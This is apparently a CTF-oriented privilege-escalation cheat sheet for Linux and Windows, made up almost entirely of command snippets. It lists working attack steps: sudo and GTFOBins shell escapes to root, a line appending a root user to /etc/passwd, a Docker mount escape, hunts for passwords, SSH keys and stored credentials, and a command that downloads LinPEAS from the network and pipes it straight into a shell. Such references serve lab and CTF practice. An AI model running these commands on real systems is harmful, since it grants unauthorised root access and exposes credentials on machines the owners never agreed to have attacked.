# Privilege Escalation Checklist

## Table of Contents
1. [Linux Quick Wins](#linux-quick-wins)
2. [Linux Detailed Checks](#linux-detailed-checks)
3. [Windows Quick Wins](#windows-quick-wins)
4. [Useful Resources](#useful-resources)

---

## Linux Quick Wins

Run these first — they cover 80% of CTF privesc scenarios:

```bash
# 1. Sudo permissions (MOST COMMON in CTFs)
sudo -l
# If you see (ALL) NOPASSWD: /usr/bin/something → check GTFOBins

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Compare against GTFOBins: https://gtfobins.github.io/

# 3. Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
# Look for writable scripts run by root

# 4. Capabilities
getcap -r / 2>/dev/null
# python3 with cap_setuid → instant root

# 5. Writable /etc/passwd
ls -la /etc/passwd
# If writable: add a root-level user
# echo 'hacker:$(openssl passwd hacked):0:0::/root:/bin/bash' >> /etc/passwd
```

## Linux Detailed Checks

### System Information
```bash
uname -a                    # Kernel version → searchsploit
cat /etc/os-release         # OS version
arch                        # Architecture
```

### Users & Groups
```bash
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group
id                          # Current user groups
who                         # Logged in users
```

### Network
```bash
ip addr                     # Interfaces
ss -tlnp                    # Listening ports (internal services!)
cat /etc/hosts              # Host entries
arp -a                      # Other hosts on network
```

### Files & Directories
```bash
# Writable directories
find / -writable -type d 2>/dev/null

# Config files with passwords
grep -rl "password" /etc/ 2>/dev/null
grep -rl "password" /var/www/ 2>/dev/null
grep -rl "password" /opt/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name ".ssh" -type d 2>/dev/null

# Recently modified files
find / -mmin -10 -type f 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.old" -o -name "*.save" 2>/dev/null
```

### Processes & Services
```bash
ps aux                      # Running processes
ps aux | grep root          # What runs as root?
systemctl list-units --type=service --state=running
```

### Automated Tools
```bash
# LinPEAS (download and run)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# pspy (monitor processes without root)
./pspy64
```

### Kernel Exploits
```bash
uname -r                    # Get kernel version
searchsploit "linux kernel $(uname -r)"
# Common: DirtyPipe, DirtyCow, PwnKit
```

### GTFOBins Patterns

If `sudo -l` shows a binary, check GTFOBins:
```bash
# Common sudo privesc examples:
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/env /bin/bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/shadow  # then !bash
sudo nano  # Ctrl+R, Ctrl+X, then: reset; bash 1>&0 2>&0
```

### Docker / LXD Escape
```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Docker group membership → root
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD group
id | grep lxd
```

---

## Windows Quick Wins

```cmd
:: 1. Current privileges
whoami /priv
:: SeImpersonatePrivilege → Potato attack

:: 2. System info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

:: 3. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

:: 4. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: 5. Stored credentials
cmdkey /list

:: 6. Scheduled tasks
schtasks /query /fo LIST /v

:: 7. Automated
winPEAS.exe
```

---

## Useful Resources

- **GTFOBins:** https://gtfobins.github.io/ (Linux binary exploitation)
- **LOLBAS:** https://lolbas-project.github.io/ (Windows Living Off The Land)
- **LinPEAS/WinPEAS:** https://github.com/peass-ng/PEASS-ng
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks:** https://book.hacktricks.wiki/
- **Exploit-DB:** https://www.exploit-db.com/ (Public exploits & shellcode)
- **SecLists:** https://github.com/danielmiessler/SecLists (Wordlists for everything)
- **Hashcat Examples:** https://hashcat.net/wiki/doku.php?id=example_hashes (Hash type identification)
- **John the Ripper:** https://www.openwall.com/john/ (Password cracker)
- **Shodan:** https://www.shodan.io/ (Internet device search)
- **VirusTotal:** https://www.virustotal.com/ (File & URL analysis)
- **CVE.org:** https://www.cve.org/ (CVE registry)
- **NVD:** https://nvd.nist.gov/ (Vulnerability database with CVSS scores)
